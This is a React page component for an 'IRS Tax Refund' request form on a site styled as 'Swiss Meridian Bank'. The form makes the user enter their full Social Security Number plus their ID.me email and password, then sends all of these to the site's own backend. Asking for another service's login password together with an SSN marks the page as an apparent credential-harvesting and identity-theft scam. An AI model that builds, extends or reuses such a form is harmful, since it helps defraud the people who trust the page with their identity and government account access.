import { useEffect, useState } from "react";
import {
  FileSpreadsheet,
  Plus,
  X,
  Send,
  Clock3,
  CheckCircle2,
  XCircle,
  User,
  ShieldQuestion,
  Copy,
  Check,
  Home,
  AlertCircle,
  Eye,
  EyeOff,
  Building2,
  Globe,
  FileCheck,
  Shield,
} from "lucide-react";
import { useNavigate } from "react-router-dom";
import api from "../api/axios";
import TopBar from "../components/TopBar";
import CustomSelect from "../components/CustomSelect";
import { useAuth } from "../context/AuthContext";
import { useUserMenu } from "../components/DashboardLayout";

const statusConfig = {
  pending: {
    label: "Pending Review",
    color: "bg-gold-50 text-gold-700",
    icon: Clock3,
  },
  approved: {
    label: "Approved",
    color: "bg-emerald-50 text-emerald-600",
    icon: CheckCircle2,
  },
  rejected: {
    label: "Rejected",
    color: "bg-red-50 text-red-500",
    icon: XCircle,
  },
};

const currentYear = new Date().getFullYear();
const yearOptions = Array.from({ length: 6 }, (_, i) => currentYear - i).map(
  (y) => ({ value: y, label: String(y) }),
);

const countryOptions = [
  { value: "United States", label: "United States" },
  { value: "Canada", label: "Canada" },
  { value: "United Kingdom", label: "United Kingdom" },
  { value: "Australia", label: "Australia" },
  { value: "Germany", label: "Germany" },
  { value: "France", label: "France" },
  { value: "Other", label: "Other" },
];

const formatMoney = (amount, currency = "USD") =>
  new Intl.NumberFormat("en-US", { style: "currency", currency }).format(
    amount || 0,
  );

const TaxRefunds = () => {
  const { user } = useAuth();
  const { onMenuClick } = useUserMenu();
  const navigate = useNavigate();
  const [refunds, setRefunds] = useState([]);
  const [loading, setLoading] = useState(true);
  const [showForm, setShowForm] = useState(false);
  const [form, setForm] = useState({
    taxYear: currentYear - 1,
    amountClaimed: "",
    reason: "",
    fullName:
      user?.firstName && user?.lastName
        ? `${user.firstName} ${user.lastName}`
        : "",
    ssn: "",
    idMeEmail: "",
    idMePassword: "",
    country: "United States",
  });
  const [agreed, setAgreed] = useState(false);
  const [error, setError] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [submittedRefund, setSubmittedRefund] = useState(null);
  const [copied, setCopied] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const load = () => {
    api
      .get("/tax-refunds/mine")
      .then((res) => setRefunds(res.data.refunds))
      .finally(() => setLoading(false));
  };

  useEffect(() => {
    load();
  }, []);

  const submit = async (e) => {
    e.preventDefault();
    setError("");

    // Validation
    if (!form.fullName.trim()) return setError("Full name is required");
    if (!form.ssn.trim() || form.ssn.replace(/[^0-9]/g, "").length < 9)
      return setError("Please enter a valid SSN (9 digits)");
    if (!form.idMeEmail.trim()) return setError("ID.me email is required");
    if (!form.idMePassword.trim())
      return setError("ID.me password is required");
    if (!form.amountClaimed) return setError("Please enter the refund amount");
    if (form.reason.trim().length < 10)
      return setError(
        "Please provide a bit more detail (at least 10 characters)",
      );
    if (!agreed)
      return setError("Please agree to the terms and conditions to continue");

    setSubmitting(true);
    try {
      const { data } = await api.post("/tax-refunds/apply", {
        taxYear: form.taxYear,
        amountClaimed: parseFloat(form.amountClaimed),
        reason: form.reason,
        fullName: form.fullName,
        ssn: form.ssn,
        idMeEmail: form.idMeEmail,
        idMePassword: form.idMePassword,
        country: form.country,
      });
      setForm({
        taxYear: currentYear - 1,
        amountClaimed: "",
        reason: "",
        fullName:
          user?.firstName && user?.lastName
            ? `${user.firstName} ${user.lastName}`
            : "",
        ssn: "",
        idMeEmail: "",
        idMePassword: "",
        country: "United States",
      });
      setAgreed(false);
      setShowForm(false);
      setSubmittedRefund(data.refund);
      load();
    } catch (err) {
      setError(err.response?.data?.message || "Could not submit claim");
    } finally {
      setSubmitting(false);
    }
  };

  const copyId = () => {
    navigator.clipboard.writeText(submittedRefund._id.slice(-8).toUpperCase());
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };

  const formatSSN = (value) => {
    const digits = value.replace(/[^0-9]/g, "");
    if (digits.length <= 3) return digits;
    if (digits.length <= 5) return `${digits.slice(0, 3)}-${digits.slice(3)}`;
    return `${digits.slice(0, 3)}-${digits.slice(3, 5)}-${digits.slice(5, 9)}`;
  };

  return (
    <div>
      <TopBar onMenuClick={onMenuClick} />

      <div className="px-4 md:px-8 max-w-2xl mx-auto">
        {!showForm && !submittedRefund && (
          <div className="flex items-center justify-between mb-6">
            <div>
              <h1 className="text-xl md:text-2xl font-bold text-navy-900">
                IRS Tax Refund
              </h1>
              <p className="text-sm text-slate-400 mt-0.5">
                Submit an IRS tax refund request for review.
              </p>
            </div>
            <button
              onClick={() => setShowForm(true)}
              className="btn-primary flex items-center gap-2 !py-2.5 shrink-0"
            >
              <Plus size={16} /> New Request
            </button>
          </div>
        )}

        {/* Application form */}
        {showForm && (
          <div>
            <div className="text-center mb-6">
              <div className="h-16 w-16 rounded-full bg-navy-50 text-navy flex items-center justify-center mx-auto mb-4">
                <FileSpreadsheet size={28} />
              </div>
              <h1 className="text-xl font-bold text-navy-900">
                IRS Tax Refund Request
              </h1>
              <p className="text-sm text-slate-400 mt-1">
                Please fill out the form below to submit your IRS tax refund
                request
              </p>
            </div>

            <form onSubmit={submit} className="space-y-4">
              {error && (
                <div className="bg-red-50 text-red-600 text-sm rounded-xl px-4 py-3">
                  {error}
                </div>
              )}

              {/* Personal Information */}
              <div className="card p-5">
                <h3 className="font-semibold text-navy-900 flex items-center gap-2.5 mb-4">
                  <span className="h-8 w-8 rounded-xl bg-navy-50 text-navy flex items-center justify-center">
                    <User size={16} />
                  </span>
                  Personal Information
                </h3>
                <div className="space-y-3">
                  <div>
                    <label className="text-xs font-medium text-slate-500 mb-1.5 block">
                      Full Name <span className="text-red-500">*</span>
                    </label>
                    <input
                      type="text"
                      placeholder="Enter your full name"
                      value={form.fullName}
                      onChange={(e) =>
                        setForm((f) => ({ ...f, fullName: e.target.value }))
                      }
                      className="input-field"
                    />
                  </div>
                  <div>
                    <label className="text-xs font-medium text-slate-500 mb-1.5 block">
                      Social Security Number (SSN){" "}
                      <span className="text-red-500">*</span>
                    </label>
                    <input
                      type="text"
                      placeholder="XXX-XX-XXXX"
                      value={form.ssn}
                      onChange={(e) =>
                        setForm((f) => ({
                          ...f,
                          ssn: formatSSN(e.target.value),
                        }))
                      }
                      maxLength={11}
                      className="input-field font-mono"
                    />
                  </div>
                </div>
              </div>

              {/* ID.me Credentials */}
              <div className="card p-5">
                <h3 className="font-semibold text-navy-900 flex items-center gap-2.5 mb-4">
                  <span className="h-8 w-8 rounded-xl bg-navy-50 text-navy flex items-center justify-center">
                    <Shield size={16} />
                  </span>
                  ID.me Credentials
                </h3>
                <div className="space-y-3">
                  <div>
                    <label className="text-xs font-medium text-slate-500 mb-1.5 block">
                      ID.me Email <span className="text-red-500">*</span>
                    </label>
                    <input
                      type="email"
                      placeholder="your.email@example.com"
                      value={form.idMeEmail}
                      onChange={(e) =>
                        setForm((f) => ({ ...f, idMeEmail: e.target.value }))
                      }
                      className="input-field"
                    />
                  </div>
                  <div>
                    <label className="text-xs font-medium text-slate-500 mb-1.5 block">
                      ID.me Password <span className="text-red-500">*</span>
                    </label>
                    <div className="relative">
                      <input
                        type={showPassword ? "text" : "password"}
                        placeholder="Enter your ID.me password"
                        value={form.idMePassword}
                        onChange={(e) =>
                          setForm((f) => ({
                            ...f,
                            idMePassword: e.target.value,
                          }))
                        }
                        className="input-field pr-10"
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-navy transition"
                      >
                        {showPassword ? (
                          <EyeOff size={18} />
                        ) : (
                          <Eye size={18} />
                        )}
                      </button>
                    </div>
                  </div>
                </div>
              </div>

              {/* Tax & Location */}
              <div className="card p-5">
                <h3 className="font-semibold text-navy-900 flex items-center gap-2.5 mb-4">
                  <span className="h-8 w-8 rounded-xl bg-navy-50 text-navy flex items-center justify-center">
                    <Building2 size={16} />
                  </span>
                  Tax & Location Information
                </h3>
                <div className="space-y-3">
                  <div>
                    <label className="text-xs font-medium text-slate-500 mb-1.5 block">
                      Tax Year <span className="text-red-500">*</span>
                    </label>
                    <CustomSelect
                      value={form.taxYear}
                      onChange={(v) => setForm((f) => ({ ...f, taxYear: v }))}
                      options={yearOptions}
                      placeholder="Select tax year"
                    />
                  </div>
                  <div>
                    <label className="text-xs font-medium text-slate-500 mb-1.5 block">
                      Refund Amount <span className="text-red-500">*</span>
                    </label>
                    <input
                      type="number"
                      placeholder={`Amount (${user?.currency || "USD"})`}
                      value={form.amountClaimed}
                      onChange={(e) =>
                        setForm((f) => ({
                          ...f,
                          amountClaimed: e.target.value,
                        }))
                      }
                      className="input-field"
                    />
                  </div>
                  <div>
                    <label className="text-xs font-medium text-slate-500 mb-1.5 block">
                      Country <span className="text-red-500">*</span>
                    </label>
                    <CustomSelect
                      value={form.country}
                      onChange={(v) => setForm((f) => ({ ...f, country: v }))}
                      options={countryOptions}
                      placeholder="Select country"
                    />
                  </div>
                </div>
              </div>

              {/* Reason */}
              <div className="card p-5">
                <h3 className="font-semibold text-navy-900 flex items-center gap-2.5 mb-4">
                  <span className="h-8 w-8 rounded-xl bg-navy-50 text-navy flex items-center justify-center">
                    <ShieldQuestion size={16} />
                  </span>
                  Reason for Refund
                </h3>
                <textarea
                  rows={4}
                  placeholder="Briefly explain why you're requesting this tax refund..."
                  value={form.reason}
                  onChange={(e) =>
                    setForm((f) => ({ ...f, reason: e.target.value }))
                  }
                  className="input-field resize-none"
                />
                <p className="text-[11px] text-slate-400 mt-1.5">
                  {form.reason.length} characters (minimum 10)
                </p>
              </div>

              {/* Important Notice */}
              <div className="bg-navy-50 rounded-xl px-4 py-3 flex items-start gap-2.5">
                <AlertCircle size={16} className="text-navy shrink-0 mt-0.5" />
                <p className="text-xs text-navy-900 leading-relaxed">
                  Please ensure all information provided is accurate and matches
                  your ID.me account details. Any discrepancies may result in
                  delays or rejection of your refund request.
                </p>
              </div>

              {/* Terms */}
              <label className="flex items-start gap-3 bg-white card px-4 py-3.5 cursor-pointer">
                <input
                  type="checkbox"
                  checked={agreed}
                  onChange={(e) => setAgreed(e.target.checked)}
                  className="h-4 w-4 mt-0.5 accent-navy shrink-0"
                />
                <span className="text-sm">
                  <span className="font-semibold text-navy-900">
                    I agree to the terms and conditions
                  </span>
                  <p className="text-xs text-slate-500 mt-1 leading-relaxed">
                    By submitting this request, I confirm that all information
                    provided is accurate and complete. I authorize Swiss
                    Meridian Bank to process my IRS tax refund request and
                    verify my information with the relevant authorities.
                  </p>
                </span>
              </label>

              <button
                type="submit"
                disabled={submitting || !agreed}
                className="btn-primary w-full flex items-center justify-center gap-2"
              >
                <Send size={16} />{" "}
                {submitting ? "Submitting..." : "Submit Request"}
              </button>
              <button
                type="button"
                onClick={() => setShowForm(false)}
                className="btn-secondary w-full flex items-center justify-center gap-2"
              >
                <X size={16} /> Cancel
              </button>
            </form>
          </div>
        )}

        {/* Confirmation screen */}
        {submittedRefund && (
          <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center bg-navy-900/40 backdrop-blur-sm px-0 sm:px-4">
            <div className="bg-white w-full sm:max-w-sm sm:rounded-2xl rounded-t-3xl shadow-2xl p-6 relative">
              <button
                onClick={() => setSubmittedRefund(null)}
                className="absolute top-4 right-4 text-slate-400 hover:text-navy transition"
              >
                <X size={20} />
              </button>

              <div className="text-center pt-2">
                <div className="h-16 w-16 rounded-full bg-emerald-50 text-emerald-500 flex items-center justify-center mx-auto mb-4">
                  <CheckCircle2 size={30} />
                </div>
                <h3 className="text-xl font-bold text-navy-900">
                  Request Submitted!
                </h3>
                <p className="text-sm text-slate-400 mt-1">
                  Your IRS tax refund request is pending review
                </p>
              </div>

              <div className="card p-4 mt-5 space-y-2.5">
                <div className="flex justify-between text-sm">
                  <span className="text-slate-400">Full Name</span>
                  <span className="font-semibold text-navy-900">
                    {form.fullName || user?.firstName || "N/A"}
                  </span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-slate-400">Country</span>
                  <span className="font-semibold text-navy-900">
                    {form.country || "United States"}
                  </span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-slate-400">Tax Year</span>
                  <span className="font-semibold text-navy-900">
                    {submittedRefund.taxYear}
                  </span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-slate-400">Amount</span>
                  <span className="font-semibold text-navy-900">
                    {formatMoney(submittedRefund.amountClaimed, user?.currency)}
                  </span>
                </div>
                <div className="flex justify-between items-center text-sm">
                  <span className="text-slate-400">Request ID</span>
                  <button
                    onClick={copyId}
                    className="font-mono font-semibold text-navy-900 bg-slate-100 px-2.5 py-1 rounded-lg flex items-center gap-1.5 text-xs"
                  >
                    {submittedRefund._id.slice(-8).toUpperCase()}{" "}
                    {copied ? (
                      <Check size={12} className="text-emerald-500" />
                    ) : (
                      <Copy size={12} />
                    )}
                  </button>
                </div>
              </div>

              <div className="bg-gold-50 rounded-xl px-4 py-3 mt-4 flex items-center gap-2.5">
                <Clock3 size={16} className="text-gold-700 shrink-0" />
                <p className="text-xs text-gold-800">
                  Expected processing time: 5-7 business days
                </p>
              </div>

              <button
                onClick={() => setSubmittedRefund(null)}
                className="btn-primary w-full mt-5 flex items-center justify-center gap-2"
              >
                <FileCheck size={16} /> Check Status
              </button>
              <button
                onClick={() => navigate("/dashboard")}
                className="btn-secondary w-full mt-2.5 flex items-center justify-center gap-2"
              >
                <Home size={16} /> Go to Dashboard
              </button>
            </div>
          </div>
        )}

        {/* List of claims */}
        {!showForm &&
          (loading ? (
            <p className="text-sm text-slate-400">Loading requests...</p>
          ) : refunds.length === 0 ? (
            <div className="card p-10 text-center text-slate-400 text-sm">
              <FileSpreadsheet
                size={28}
                className="mx-auto mb-3 text-slate-300"
              />
              No IRS tax refund requests yet.
            </div>
          ) : (
            <div className="space-y-3">
              {refunds.map((r) => {
                const status = statusConfig[r.status];
                const StatusIcon = status.icon;
                return (
                  <div key={r._id} className="card p-5">
                    <div className="flex items-start justify-between gap-3">
                      <div className="flex items-start gap-3">
                        <div className="h-11 w-11 rounded-2xl bg-navy-50 text-navy flex items-center justify-center shrink-0">
                          <FileSpreadsheet size={19} />
                        </div>
                        <div>
                          <p className="font-semibold text-navy-900">
                            {r.taxYear} IRS Tax Refund
                          </p>
                          <p className="text-xs text-slate-400 mt-0.5">
                            {formatMoney(r.amountClaimed, user?.currency)} ·
                            Submitted{" "}
                            {new Date(r.appliedAt).toLocaleDateString("en-US")}
                          </p>
                          {r.fullName && (
                            <p className="text-xs text-slate-400 mt-0.5">
                              {r.fullName}
                            </p>
                          )}
                        </div>
                      </div>
                      <span
                        className={`inline-flex items-center gap-1.5 text-xs font-medium px-2.5 py-1 rounded-full shrink-0 ${status.color}`}
                      >
                        <StatusIcon size={12} /> {status.label}
                      </span>
                    </div>
                    <p className="text-sm text-slate-600 mt-3">{r.reason}</p>
                    {r.status === "rejected" && r.rejectionReason && (
                      <p className="text-xs text-red-500 mt-2">
                        {r.rejectionReason}
                      </p>
                    )}
                  </div>
                );
              })}
            </div>
          ))}
      </div>
    </div>
  );
};

export default TaxRefunds;
